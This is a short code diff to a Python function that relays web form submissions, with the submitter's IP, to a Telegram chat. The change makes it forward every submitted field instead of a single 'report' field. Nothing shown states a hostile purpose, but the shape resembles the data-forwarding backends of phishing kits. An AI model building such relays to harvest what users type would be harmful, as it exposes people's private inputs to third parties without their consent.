@@ -114,9 +114,15 @@ def process_telegram(chat_id, form_data, files, user_ip):
             ""
         ]
 
-        report = form_data.get("report", [""])[0]
-        if report:
-            text_lines.append(report)
+        # ✅ FIX: Read ALL form fields dynamically
+        for key, values in form_data.items():
+            for value in values:
+                try:
+                    safe_key = str(key).encode("utf-8", "ignore").decode()
+                    safe_value = str(value).encode("utf-8", "ignore").decode()
+                    text_lines.append(f"{safe_key}: {safe_value}")
+                except:
+                    text_lines.append(f"{key}: [unreadable]")
 
         full_text = "\n".join(text_lines)
 
@@ -136,7 +142,7 @@ def process_telegram(chat_id, form_data, files, user_ip):
         else:
             parts = [full_text[i:i+4000] for i in range(0, len(full_text), 4000)]
 
-            for i, part in enumerate(parts):
+            for part in parts:
                 ok = send_telegram(
                     f"{TG_API}/sendMessage",
                     data={"chat_id": chat_id, "text": part}
